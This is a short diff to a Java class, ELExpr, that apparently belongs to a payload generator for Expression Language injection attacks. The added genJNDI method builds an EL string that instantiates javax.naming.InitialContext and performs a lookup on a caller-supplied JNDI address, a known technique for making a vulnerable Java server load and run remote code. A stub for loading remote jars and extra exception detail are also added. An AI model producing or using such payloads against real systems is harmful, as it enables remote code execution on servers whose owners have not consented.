@@ -70,13 +70,21 @@ public class ELExpr implements IExpr {
             };
         } catch (Exception ex) {
             return new String[]{
-                    "class文件异常"
+                    "class文件异常",
+                    Utils.getErrDetail(ex)
             };
         }
     }
 
     @Override
     public String[] genJNDI(String jndiAddress) {
-        return null;
+        return new String[]{
+                out("\"\".getClass().forName(\"javax.naming.InitialContext\").newInstance().lookup(\"" + jndiAddress + "\")")
+        };
+    }
+
+    @Override
+    public String[] genLoadJar(String url, String className) {
+        return new String[0];
     }
 }
